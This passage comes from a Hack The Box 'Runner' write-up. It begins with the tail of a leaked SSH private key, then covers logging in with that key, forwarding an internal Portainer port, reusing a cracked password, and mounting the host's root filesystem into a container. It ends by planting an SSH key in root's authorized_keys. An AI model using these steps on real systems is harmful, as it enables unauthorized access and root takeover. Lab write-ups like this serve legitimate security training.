3np1+WO8+Qn2E189HvG+q554GQyXMwCedj39OY71DphY60j61BtNBGJ4S+3TBXExmY4Rtg
lcZW00VkIbF7BuCEQyqRwDXjAk4pjrnhdJQAfaDz/jV5o/cAAAAMEAugPWcJovbtQt5Ui9
WQaNCX1J3RJka0P9WG4Kp677ZzjXV7tNufurVzPurrxyTUMboY6iUA1JRsu1fWZ3fTGiN/
TxCwfxouMs0obpgxlTjJdKNfprIX7ViVrzRgvJAOM/9WixaWgk7ScoBssZdkKyr2GgjVeE
7jZoobYGmV2bbIDkLtYCvThrbhK6RxUhOiidaN7i1/f1LHIQiA4+lBbdv26XiWOw+prjp2
EKJATR8rOQgt3xHr+exgkGwLc72Q61AAAAwQDO2j6MT3aEEbtgIPDnj24W0xm/r+c3LBW0
axTWDMGzuA9dg6YZoUrzLWcSU8cBd+iMvulqkyaGud83H3C17DWLKAztz7pGhT8mrWy5Ox
KzxjsB7irPtZxWmBUcFHbCrOekiR56G2MUCqQkYfn6sJ2v0/Rp6PZHNScdXTMDEl10qtAW
QHkfhxGO8gimrAvjruuarpItDzr4QcADDQ5HTU8PSe/J2KL3PY7i4zWw9+/CyPd0t9yB5M
KgK8c9z2ecgZsAAAALam9obkBydW5uZXI=
-----END OPENSSH PRIVATE KEY-----
```

```bash
❯ chmod 600 teamcity-id_rsa
❯ ssh -i teamcity-id_rsa john@runner.htb
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-102-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro
<..SNIP>
john@runner:~$ 
```

And I can see user.txt:

```bash
john@runner:~$ cat user.txt 
41****************************d1
```

# Access as root

Looking at internal ports open at localhost, I can see port 9443, 53 (DNS), 8111, 5005 and 9000:

```bash
john@runner:~$ netstat -ntlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:9443          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8111          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5005          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::8000                 :::*                    LISTEN      -
```

8111 is for teamcity, 5005 gives an empty reply and 9443 is same as 9000 but ssl version:

**8111**
```bash
john@runner:~$ curl -i localhost:8111; echo
HTTP/1.1 401 
TeamCity-Node-Id: MAIN_SERVER
WWW-Authenticate: Basic realm="TeamCity"
WWW-Authenticate: Bearer realm="TeamCity"
Cache-Control: no-store
Content-Type: text/plain;charset=UTF-8
Transfer-Encoding: chunked
Date: Thu, 22 Aug 2024 07:09:44 GMT

Authentication required
To login manually go to "/login.html" page
```

**5005**
```bash
john@runner:~$ curl -i localhost:5005; echo
curl: (52) Empty reply from server
```

**9443**

```http
john@runner:~$ curl -i -k https://localhost:9443
HTTP/1.1 200 OK
Accept-Ranges: bytes
Cache-Control: max-age=31536000
Content-Length: 19130
Content-Type: text/html; charset=utf-8
Last-Modified: Thu, 07 Dec 2023 08:15:07 GMT
Vary: Accept-Encoding
X-Content-Type-Options: nosniff
X-Xss-Protection: 1; mode=block
Date: Thu, 22 Aug 2024 07:11:07 GMT

<!doctype html><html lang="en" ng-app="portainer" ng-strict-di data-edition="CE"><head><meta charset="utf-8"/><title>Portainer</title><meta name="description" content=""/><meta name="author" content="Portainer.io"/><meta http-equiv="cache-control" content="no-cache"/><meta http-equiv="expires" content="0"/><meta http-equiv="pragma" content="no-cache"/><base id="base"/><script>if (window.origin == 'file://') {
        // we are loading the app from a local file as in docker extension
        document.getElementById('base').href = 'http://localhost:49000/';

        window.ddExtension = true;
      } else {
        var path = window.location.pathname.replace(/^\/+|\/+$/g, '');
        var basePath = path ? '/' + path + '/' : '/';
        document.getElementById('base').href = basePath;
      }</script><!--[if lt IE 9]>
      <script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script>
<..SNIP..>
```

**9000**
```http
john@runner:~$ curl -i localhost:9000
HTTP/1.1 200 OK
Accept-Ranges: bytes
Cache-Control: max-age=31536000
Content-Length: 19130
Content-Type: text/html; charset=utf-8
Last-Modified: Thu, 07 Dec 2023 08:15:07 GMT
Vary: Accept-Encoding
X-Content-Type-Options: nosniff
X-Xss-Protection: 1; mode=block
Date: Thu, 22 Aug 2024 07:12:35 GMT

<!doctype html><html lang="en" ng-app="portainer" ng-strict-di data-edition="CE"><head><meta charset="utf-8"/><title>Portainer</title><meta name="description" content=""/><meta name="author" content="Portainer.io"/><meta http-equiv="cache-control" content="no-cache"/><meta http-equiv="expires" content="0"/><meta http-equiv="pragma" content="no-cache"/><base id="base"/><script>if (window.origin == 'file://') {
        // we are loading the app from a local file as in docker extension
        document.getElementById('base').href = 'http://localhost:49000/';

        window.ddExtension = true;
      } else {
        var path = window.location.pathname.replace(/^\/+|\/+$/g, '');
        var basePath = path ? '/' + path + '/' : '/';
        document.getElementById('base').href = basePath;
      }</script><!--[if lt IE 9]>
      <script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script>
```

It seems like a portainer.io instance. Searching in google, its like a container manager:

![what is portainer.io](/assets/images/Runner/what-is-portainer.io.png)

I will take advantage that I'm in a ssh shell to do a port forwarding of port 9000 of runner to be accessible by my port 9000:

```bash
❯ ssh -i id_rsa john@runner.htb -L 9000:127.0.0.1:9000
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-102-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro
<..SNIP..>
Last login: Thu Aug 22 07:06:16 2024 from 10.10.14.106
john@runner:~$ 
```

Now its accessible in my machine:

![portainer accessible in my machine](/assets/images/Runner/portainer-accessible-in-my-machine.png)

It asks me credentials so I will try the one I saw before in the teamcity's database (matthew:piper123) and it works:

![access to portainer panel](/assets/images/Runner/access-to-portainer.png)

I will do the same thing as ever with containers, create a volume to mount / and start a container with that volume to have access to all the host filesystem as root.

First, I will create the volume:

![volumes button](/assets/images/Runner/volumes-button.png)

![add volume button](/assets/images/Runner/add-volume-button.png)

![create volume options](/assets/images/Runner/create-volume-options.png)

Here I specified that the device to mount should be / (to mount the entire filesystem). Now I will create the container that uses this volume and mount it in /mnt:

![containers button](/assets/images/Runner/containers-button.png)

![add container button](/assets/images/Runner/add-container-button.png)

Is here when I specify the volume:

![container settings](/assets/images/Runner/container-settings.png)

When the container is deployed, start it and access the tty that the web offers:

![access container console](/assets/images/Runner/access-container-console.png)

Specify the root user and click on connect:

![connect to console](/assets/images/Runner/connect-to-console.png)

And I can see the root.txt:

![root.txt visible](/assets/images/Runner/root.txt-visible.png)

If I wanted to gain access to the machine, I could copy my id_rsa.pub and introduce it in authorized keys:

![introducing pub in authorized_keys](/assets/images/Runner/introducing-pub-in-authorized_keys.png)

Now I can access as root in runner:

```bash
❯ ssh root@10.10.11.13
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-102-generic x86_64)

<..SNIP..>


Last login: Mon Apr 15 09:34:20 2024 from 10.10.14.52
root@runner:~# ls -a
.  ..  .bash_history  .bashrc  .cache  .docker  docker_clean.sh  initial_state.txt  .local  monitor.sh  .profile  root.txt  .ssh
root@runner:~# whoami
root
root@runner:~# hostname -I
10.10.11.13 172.17.0.1 172.18.0.1 dead:beef::250:56ff:feb9:f553 
root@runner:~# hostname
runner
```

{% endraw %}
